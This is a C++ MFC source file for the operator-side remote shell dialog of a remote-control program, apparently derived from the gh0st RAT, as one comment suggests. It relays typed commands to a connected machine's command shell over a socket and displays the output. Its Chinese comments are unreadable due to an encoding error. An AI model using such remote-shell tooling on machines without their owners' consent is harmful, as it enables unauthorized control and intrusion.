// ShellDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "../thirdpart/macros.h"

// CShellDlg �Ի���

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent /*= NULL*/, CIOCPServer* pIOCPServer /*= NULL*/, ClientContext *pContext /*= NULL*/)
	: CDialogEx(IDD_SHELL_DLG, pParent), m_iocpServer(pIOCPServer), m_pContext(pContext), m_nCurSel(0), m_nReceiveLength(0)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_SHELL, m_edit_shell);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT_SHELL, &CShellDlg::OnEnChangeEditShell)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg ��Ϣ�������


void CShellDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialogEx::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	ResizeEdit();
}

void CShellDlg::ResizeEdit(void)
{
	if (NULL == m_edit_shell.m_hWnd)
	{
		return;
	}

	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit_shell.MoveWindow(&rectEdit);
}


BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
									//�õ���ǰ���ڵ����ݴ�С  ��ʼ��ʱ���ֵӦ��Ϊ0
	m_nCurSel = m_edit_shell.GetWindowTextLength();

	//�õ�����˵�IP����ʾ�����ڵı�����
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - Զ���ն�", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit_shell.SetLimitText(MAXDWORD); // ������󳤶�

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}


void CShellDlg::OnEnChangeEditShell()
{
	// TODO:  ����ÿؼ��� RICHEDIT �ؼ���������
	// ���ʹ�֪ͨ��������д CDialogEx::OnInitDialog()
	// ���������� CRichEditCtrl().SetEventMask()��
	// ͬʱ�� ENM_CHANGE ��־�������㵽�����С�

	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	int len = m_edit_shell.GetWindowTextLength();
	if (len < m_nCurSel)
	{
		m_nCurSel = len;
	}		
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_SHELL) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}

	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}

void CShellDlg::OnReceiveComplete(void)
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit_shell.GetWindowTextLength();
}


void CShellDlg::AddKeyBoardData(void)
{
	// �������0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	//�滻��ԭ���Ļ��з�  ����cmd �Ļ���ͬw32�µı༭�ؼ��Ļ��з���һ��
	strResult.Replace("\n", "\r\n");
	//�õ���ǰ���ڵ��ַ�����
	int	len = m_edit_shell.GetWindowTextLength();
	//����궨λ����λ�ò�ѡ��ָ���������ַ�
	m_edit_shell.SetSel(len, len);
	//�ô��ݹ����������滻����λ�õ��ַ�  
	m_edit_shell.ReplaceSel(strResult);
	//���µõ��ַ��Ĵ�С
	m_nCurSel = m_edit_shell.GetWindowTextLength();
	//�������ǻ���Ū������ ���ݴ��䵽���ض˺�Ĵ���
	//�����ض˵�����ʱ�������ݵ�������ϵ��أ���
	//����ע�⵽��������ʹ��Զ���ն�ʱ �����͵�ÿһ�������� ����һ�����з�  ����һ���س�
	//Ҫ�ҵ�����س��Ĵ������Ǿ�Ҫ��PreTranslateMessage�����Ķ���
}

BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	//����Ǽ��̰���
	if (pMsg->message == WM_KEYDOWN)
	{		
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return true;  // ����VK_ESCAPE��VK_DELETE
		}
			
		//����ǿɱ༭��Ļس���
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit_shell.m_hWnd)
		{
			//�õ����ڵ����ݴ�С
			int	len = m_edit_shell.GetWindowTextLength();
			CString str;			
			m_edit_shell.GetWindowText(str);  //�õ����ڵ��ַ�����
			str += "\r\n";
			//ע��gh0st�������õ���ǰ�����ݵ� �õ������Ļ������ټ���ԭ�е��ַ���λ�ã���ʵ�����û���ǰ�����������
			//Ȼ�����ݷ��ͳ�ȥ��
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit_shell.GetWindowTextLength();
		}
		// ����VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit_shell.m_hWnd)
		{
			if (m_edit_shell.GetWindowTextLength() <= m_nReceiveLength)
			{
				return true;
			}				
		}
	}
	// Ctrlû����
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit_shell.GetWindowTextLength();
		m_edit_shell.SetSel(len, len);
		// �û�ɾ���˲������ݣ��ı�m_nCurSel
		if (len < m_nCurSel)
		{
			m_nCurSel = len;
		}			
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}
